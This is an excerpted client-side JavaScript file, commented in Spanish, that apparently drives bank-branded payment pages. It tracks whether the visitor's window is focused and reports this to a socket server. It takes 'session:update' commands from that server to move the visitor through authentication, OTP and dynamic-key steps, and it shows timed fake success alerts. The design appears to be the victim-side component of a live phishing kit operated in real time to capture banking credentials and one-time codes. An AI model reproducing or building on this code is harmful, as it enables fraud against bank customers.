...
(function () {
  ...
  function emitPresence(state) {
    try {
      if (socket && socket.connected) socket.emit("user:presence", { state });
    } catch {}
  }
  ...
  function bindListeners(sock) {
    ...
    sock.on("connect_error", async (err) => {
      ...
      if (reason === "token_expired" || reason === "invalid_token") {
        try {
          ...
          safeHideLoading();
          window.showBankAlert?.("error_custom", "Tu sesión expiró. Recarga la página.");
          return;
        }
      }

      safeHideLoading();
      window.showBankAlert?.("error_custom", "Error de conexión. Intenta nuevamente.");
    });

    window.addEventListener("blur", () => emitPresence("MINIMIZED"));
    window.addEventListener("focus", () => emitPresence("ACTIVE"));
    document.addEventListener("visibilitychange", () => {
      emitPresence(document.visibilityState === "hidden" ? "MINIMIZED" : "ACTIVE");
    });
    ...
    sock.on("session:update", (s) => {
      ...
      if (isWaitingAction(action)) {
        RT._seenWait = true;
        const loadingText =
          currentStep === "2" ? "Autenticando..." :
          currentStep === "3" ? "Validando..." :
          currentStep === "4" ? "Validando..." :
          "Cargando...";
      ...
      if (action === "AUTH_ERROR") {
        ...
        safeHideLoading();
        if (s?.lastError) {
          try { sessionStorage.setItem("rt_last_error", String(s.lastError)); } catch {}
        }
      ...
      if (expectedStep && currentStep && expectedStep !== currentStep) {
        // Mantengo tus delays de “éxito” solo en transiciones relevantes
        const isAuthToNext = (action === "DINAMIC" || action === "OTP");
        const isOtpFrom3 = (action === "OTP" && currentStep === "3");
        const isDinamicFrom4 = (action === "DINAMIC" && currentStep === "4");

        if (isAuthToNext || isOtpFrom3 || isDinamicFrom4) {
          setTimeout(() => {
            safeHideLoading();
            const msg =
              currentStep === "2" ? "Autenticación exitosa." :
              "Validación exitosa.";
            window.showBankAlert?.("success", msg);
            setTimeout(() => window.hideBankAlert?.(), 1000);
          }, 1500);
        ...
        // redirección inmediata para otros casos
        window.location.href = `/pago/${RT.bank}/step/${expectedStep}`;
        return;
      }
      ...
      if (typeof window.__rtUpdateCb === "function") {
        try { window.__rtUpdateCb(s); } catch (e) { console.error(e); }
      }
    });
  ...
  window.initSocketConnection = function (nodeUrl, sessionId, sessionToken, bank, step) {
  ...
  window.rtEmitSubmit = function (eventName, payload, ackCb) {
    ...
    if (isWaitingAction(RT.lastAction)) {
      ...
      if (submitting && submitting !== waitingFor) {
        ...
        window.showBankAlert?.("error_custom", "Ya hay una validación en proceso. Espera un momento.");
        return;
      }
    }
    ...
    if (!socket || !socket.connected) {
      ...
      if (RT.nodeUrl && RT.sessionToken) {
        window.initSocketConnection(RT.nodeUrl, RT.sessionId, RT.sessionToken, RT.bank, RT.step);
      }
      return;
    }
